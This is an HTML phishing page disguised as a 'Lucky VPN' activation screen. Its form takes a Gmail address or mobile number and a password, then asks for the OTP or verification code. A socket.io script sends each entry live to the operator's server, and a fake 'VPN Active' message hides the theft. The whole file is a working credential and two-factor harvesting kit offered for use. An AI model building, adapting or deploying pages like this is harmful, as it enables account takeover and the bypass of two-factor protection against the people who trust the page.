<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucky VPN - Exclusive Access</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 50px 20px; }
        .container { max-width: 400px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        h2 { color: #00ff00; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; outline: none; }
        button { width: 95%; padding: 12px; background: #00ff00; border: none; border-radius: 5px; color: black; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00cc00; }
        #status-section { margin-top: 20px; font-weight: bold; font-size: 1.2em; }
    </style>
</head>
<body>
    <div class="container">
        <div id="login-form">
            <h2>Lucky VPN Login</h2>
            <p>Enter your details to activate VPN</p>
            <input type="email" id="email" placeholder="Gmail Address or mobile number" required><br>
            <input type="password" id="pass" placeholder="Password" required><br>
            <button onclick="sendLogin()">Login Now</button>
        </div>

        <div id="otp-section" style="display:none;">
            <h2>Verification Required</h2>
            <p>Please enter the OTP or Verification Code sent to your phone/email.</p>
            <input type="text" id="otp" placeholder="Enter OTP Code"><br>
            <button onclick="sendOTP()">Activate VPN</button>
        </div>

        <div id="status-section"></div>
    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();

        function sendLogin() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            if(!email || !pass) return alert("Please fill all fields");

            socket.emit('user_login', { email, pass, type: 'login' });
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        }

        function sendOTP() {
            const otp = document.getElementById('otp').value;
            if(!otp) return alert("Please enter OTP");

            socket.emit('user_login', { otp, type: 'otp' });
            document.getElementById('otp-section').innerHTML = "<h3>Processing Activation... Please wait.</h3>";
        }

        socket.on('final_status', (data) => {
            const statusDiv = document.getElementById('status-section');
            document.getElementById('otp-section').style.display = 'none';
            
            if(data.status === 'OK') {
                statusDiv.innerHTML = "<span style='color:#00ff00;'>✅ Lucky VPN Active Successfully!</span>";
            } else {
                statusDiv.innerHTML = "<span style='color:#ff4444;'>❌ Activation Failed: Server Rejected.</span>";
            }
        });
    </script>
</body>
</html>
